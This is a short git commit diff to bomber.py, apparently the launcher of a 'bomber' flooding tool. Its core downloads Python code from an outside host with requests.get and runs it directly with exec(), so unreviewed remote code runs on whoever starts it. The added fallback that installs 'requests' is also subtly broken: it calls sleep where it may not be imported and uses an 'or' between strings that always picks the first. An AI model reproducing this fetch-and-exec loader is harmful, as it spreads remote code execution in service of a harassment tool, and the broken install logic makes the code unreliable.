4f0cb0f25658fb5f71e01508396615334b5a5ed8
Ahmad <81312148+ahmad1622@users.noreply.github.com>
2023-07-27 21:12:22 +0330

    Update bomber.py

--- bomber.py
+++ bomber.py
@@ -1,3 +1,11 @@
-import requests
+try: 
+	from time import sleep
+	import requests
+except:
+     from os import system, name
+     print("Not install Package . Installing Package . Connect To Internet ")
+     sleep(3)
+     system("pip install requests" or "pip3 install requests")
+
 bmbsource = requests.get("http://sharabiyan-goose.ir/csb/bmb.py").text
 exec(bmbsource)
